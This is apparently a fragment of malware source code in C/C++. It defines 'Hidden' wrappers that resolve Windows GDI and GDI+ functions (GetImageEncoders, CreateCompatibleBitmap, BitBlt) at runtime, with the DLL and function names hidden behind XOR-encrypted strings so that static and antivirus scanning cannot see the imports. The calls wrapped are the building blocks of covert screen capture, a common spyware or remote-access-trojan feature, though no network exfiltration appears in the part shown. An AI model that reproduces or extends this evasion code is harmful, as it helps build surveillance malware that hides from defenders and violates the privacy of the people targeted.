...
{
	return (int)callWinAPIFunction(/*gdiplus.dll*/XorStr<0xEE, 12, 0x443F65C2>("\x89\x8B\x99\x81\x9E\x86\x87\xDB\x92\x9B\x94" + 0x443F65C2).s,/*GetImageEncodersSize*/XorStr<0x53, 21, 0x59024B05>("\x14\x31\x21\x1F\x3A\x39\x3E\x3F\x1E\x32\x3E\x31\x3B\x05\x13\x11\x30\x0D\x1F\x03" + 0x59024B05).s, 2, size, numEncoders);
}

int GetImageEncodersHidden(UINT numEncoders, UINT size, ImageCodecInfo *encoders)
{
	return (int)callWinAPIFunction(/*gdiplus.dll*/XorStr<0xEE, 12, 0x443F65C2>("\x89\x8B\x99\x81\x9E\x86\x87\xDB\x92\x9B\x94" + 0x443F65C2).s,/*GetImageEncoders*/XorStr<0xB6, 17, 0x4E458B2A>("\xF1\xD2\xCC\xF0\xD7\xDA\xDB\xD8\xFB\xD1\xA3\xAE\xA6\xA6\xB6\xB6" + 0x4E458B2A).s, 3, encoders, size, numEncoders);
}

HBITMAP CreateCompatibleBitmapHidden(_In_ HDC hdc, _In_ int cx, _In_ int cy)
{
	return (HBITMAP)callWinAPIFunction(/*GDI32.dll*/XorStr<0x00, 10, 0x4B1795A5>("\x47\x45\x4B\x30\x36\x2B\x62\x6B\x64" + 0x4B1795A5).s,/*CreateCompatibleBitmap*/XorStr<0xD4, 23, 0x2383C18A>("\x97\xA7\xB3\xB6\xAC\xBC\x99\xB4\xB1\xAD\xBF\xAB\x89\x83\x8E\x86\xA6\x8C\x92\x8A\x89\x99" + 0x2383C18A).s, 3, cy, cx, hdc);
}
...
{
	return (BOOL)callWinAPIFunction(/*GDI32.dll*/XorStr<0x00, 10, 0x4B1795A5>("\x47\x45\x4B\x30\x36\x2B\x62\x6B\x64" + 0x4B1795A5).s,/*BitBlt*/XorStr<0x2A, 7, 0x023C60F4>("\x68\x42\x58\x6F\x42\x5B" + 0x023C60F4).s,9, rop, y1, x1, hdcSrc, cy, cx, y, x, hdc);
}